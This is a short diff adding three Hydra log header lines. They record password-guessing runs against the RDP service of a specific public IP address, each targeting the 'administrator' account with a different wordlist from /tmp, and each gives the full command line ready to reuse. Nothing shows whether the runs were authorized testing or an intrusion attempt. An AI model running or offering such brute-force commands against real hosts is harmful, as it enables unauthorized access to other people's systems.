@@ -1,0 +1,3 @@
+# Hydra v9.2 run at 2026-07-29 07:28:09 on 8.218.243.29 rdp (hydra -l administrator -P /tmp/final_passwords.txt -t 1 -V -o /tmp/hydra_rdp_results.txt rdp://8.218.243.29)
+# Hydra v9.2 run at 2026-07-29 07:28:47 on 8.218.243.29 rdp (hydra -l administrator -P /tmp/clean_final.txt -t 1 -V -o /tmp/hydra_rdp_results.txt rdp://8.218.243.29)
+# Hydra v9.2 run at 2026-07-29 07:29:40 on 8.218.243.29 rdp (hydra -l administrator -I -P /tmp/seclist_clean.txt -t 1 -V -o /tmp/hydra_rdp_results.txt rdp://8.218.243.29)
